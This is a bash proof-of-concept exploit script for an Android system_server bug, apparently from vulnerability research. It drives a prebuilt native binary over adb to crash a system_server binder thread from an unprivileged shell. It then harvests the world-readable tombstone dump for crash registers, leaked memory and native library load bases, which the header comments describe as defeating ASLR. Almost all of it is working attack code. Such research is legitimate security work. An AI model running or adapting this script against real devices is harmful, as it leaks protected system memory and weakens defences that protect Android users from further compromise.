#!/bin/bash
# Reliable system_server info-leak for P0-465827985, from unprivileged shell.
#
# The reporter's leak sprays Bitmap ashmem and hopes a system_server stack
# overflows into it (~5-10%). This takes the bug's most dependable effect --
# crashing a system_server binder thread past its guard page (100% at depth
# >=~148) -- and harvests the crash dump instead: tombstones on this build are
# mode 0664 (world-readable), so shell reads the faulting thread's registers,
# the full memory map (native-library load bases = ASLR defeat) and ~19 blocks
# of live system_server memory. One crash, no spray-adjacency luck. No root.
#
#   ./leak.sh            # build if needed, push, crash once, print the leak
#   DEPTH=200 ./leak.sh
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
D="${DEVICE:-$(adb devices | awk 'NR==2{print $1}')}"
DEPTH="${DEPTH:-200}"; HOG="${HOG:-8}"
REPRO=/data/local/tmp/repro

[ -f "$HERE/libs/arm64-v8a/repro" ] || {
  NDK="${NDK:-$(ls -d "${ANDROID_HOME:-$HOME/Archives/Android}"/ndk/27.* 2>/dev/null | sort -V | tail -1)}"
  "$NDK/ndk-build" NDK_PROJECT_PATH="$HERE" NDK_APPLICATION_MK="$HERE/Application.mk" || exit 1
}
until adb -s "$D" shell 'service check activity' 2>/dev/null | grep -q found; do sleep 3; done
adb -s "$D" push "$HERE/libs/arm64-v8a/repro" "$REPRO" >/dev/null || exit 1

before=$(adb -s "$D" shell 'ls -t /data/tombstones/tombstone_[0-9]*[0-9] 2>/dev/null | head -1' | tr -d '\r')
echo "[*] crashing a system_server binder thread (depth $DEPTH)..."
timeout 90 adb -s "$D" shell -tt "DP_FRESH=0 DP_DEPTH=$DEPTH DP_NUM_HOG=$HOG $REPRO" 2>&1 \
  | grep -aE 'DP_RESULT' | tail -1

# find the fresh system_server tombstone
new=""
for _ in $(seq 1 20); do
  cand=$(adb -s "$D" shell 'ls -t /data/tombstones/tombstone_[0-9]*[0-9] 2>/dev/null | head -1' | tr -d '\r')
  if [ -n "$cand" ] && [ "$cand" != "$before" ] \
     && adb -s "$D" shell "grep -aq 'Cmdline: system_server' '$cand'"; then new="$cand"; break; fi
  sleep 1
done
[ -n "$new" ] || { echo "[!] no fresh system_server tombstone (did it not crash?)"; exit 1; }

echo; echo "[+] leaked from $new (read as $(adb -s "$D" shell id -un | tr -d '\r')):"
echo "--- fault ---"
adb -s "$D" shell "grep -aE 'signal |Abort message|name:' '$new' | head -3" | tr -d '\r'
echo "--- native library load bases (system_server ASLR defeat) ---"
adb -s "$D" shell "grep -aE ' r-x .*/(libart|libandroid_runtime|libbinder|libhwui|libc)\.so' '$new'" | tr -d '\r' \
  | sed -E "s/ *([0-9a-f']+)-.* (\/.*\.so).*/  \2  base=\1/"
echo "--- leaked pointers (crash registers) ---"
adb -s "$D" shell "grep -aE '^ +(x[0-9]+|lr|sp|pc) ' '$new' | head -8" | tr -d '\r'
echo "--- one leaked memory block ---"
adb -s "$D" shell "awk '/memory near/{n++} n==1{print} n==2{exit}' '$new' | head -8" | tr -d '\r'
echo
echo "[i] save full dump:  adb -s $D pull $new"
